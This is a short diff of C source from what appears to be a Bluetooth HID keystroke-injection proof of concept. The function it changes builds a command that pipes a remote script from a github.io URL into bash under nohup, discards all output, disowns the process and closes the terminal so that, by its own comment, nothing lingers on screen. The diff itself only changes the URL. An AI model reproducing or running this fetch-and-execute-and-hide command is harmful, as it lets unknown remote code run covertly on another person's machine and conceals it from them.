@@ -36,7 +36,7 @@ static void buildPairCmd(char* out, size_t n) {
     // (nohup + disown, output to pair.log, stdin from /dev/null) and closes the
     // terminal (exit) so nothing lingers on screen.
     snprintf(out, n,
-        "nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc-web/pair.sh | bash -s %s'"
+        "nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc/pair.sh | bash -s %s'"
         " >/dev/null 2>&1 & disown; exit", bleHidMac());
 }
 
